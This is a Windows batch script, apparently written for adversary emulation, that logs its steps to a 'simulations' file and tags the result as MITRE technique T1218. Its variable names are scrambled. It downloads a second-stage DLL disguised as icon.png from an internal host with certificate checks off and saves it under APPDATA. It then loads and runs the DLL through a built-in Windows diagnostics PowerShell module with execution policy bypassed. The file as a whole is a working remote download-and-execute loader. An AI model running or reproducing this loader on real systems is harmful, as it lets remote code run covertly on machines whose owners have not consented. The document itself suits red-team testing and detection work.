@echo off
setlocal enabledelayedexpansion

REM --- Placeholder constant declarations (random-named SET vars) ---
SET a1B2cD3e=%APPDATA%\11983\77356254
SET f4G5hI6j=4eb1e47b.txt
SET k7L8mN9o=https://10.0.0.49/stage/2/icon.png?11983-7
SET p0Q1rS2t=ITZEL-S2B
SET u3V4wX5y=11983
SET z6A7bC8d=7
SET E9f0G1h2=%PUBLIC%\\macula-simulations.log
SET I3j4K5l6=https://10.0.0.49

REM --- Cache timestamp for debug logging ---
SET tsvar=!DATE!/!TIME!

REM --- Debug logging helper (always appends to log file) ---
REM All debug lines use delayed expansion for vars, redirect to log file with 2>nul

REM --- Step 1: Heartbeat fetch (download Stage 2 Loader DLL) ---
echo [!tsvar!][DEBUG][!p0Q1rS2t!][!u3V4wX5y!]: heartbeat_start>> "!E9f0G1h2!" 2>nul
if not exist "!a1B2cD3e!" mkdir "!a1B2cD3e!" 2>nul
curl -k -s -o "!a1B2cD3e!\!f4G5hI6j!" "!k7L8mN9o!"
echo [!tsvar!][DEBUG][!p0Q1rS2t!][!u3V4wX5y!]: heartbeat_complete>> "!E9f0G1h2!" 2>nul

REM --- Step 2: Position working directory ---
echo [!tsvar!][DEBUG][!p0Q1rS2t!][!u3V4wX5y!]: chdir_start>> "!E9f0G1h2!" 2>nul
cd /d "!a1B2cD3e!" >nul 2>&1
echo [!tsvar!][DEBUG][!p0Q1rS2t!][!u3V4wX5y!]: chdir_result=0>> "!E9f0G1h2!" 2>nul

REM --- Step 3: Invoke Stage 2 DLL via PowerShell LOLBIN ---
echo [!tsvar!][DEBUG][!p0Q1rS2t!][!u3V4wX5y!]: powershell_start>> "!E9f0G1h2!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; RegSnapin %APPDATA%\11983\77356254\\4eb1e47b.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set _ps_exit=!errorlevel!
echo [!tsvar!][DEBUG][!p0Q1rS2t!][!u3V4wX5y!]: powershell_complete>> "!E9f0G1h2!" 2>nul

REM --- TTP Logging ---
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
if !_ps_exit! equ 0 (
    set _ttp_result=OK
    set _ttp_error=
) else (
    set _ttp_result=FAIL
    set _ttp_error=powershell_error !_ps_exit!
)
echo [!timestamp!][TTP][!p0Q1rS2t!][!u3V4wX5y!]: T1218^|System Binary Proxy Execution=[!_ttp_result!]:[!_ttp_error!]>> "!E9f0G1h2!" 2>&1

endlocal
exit /b 0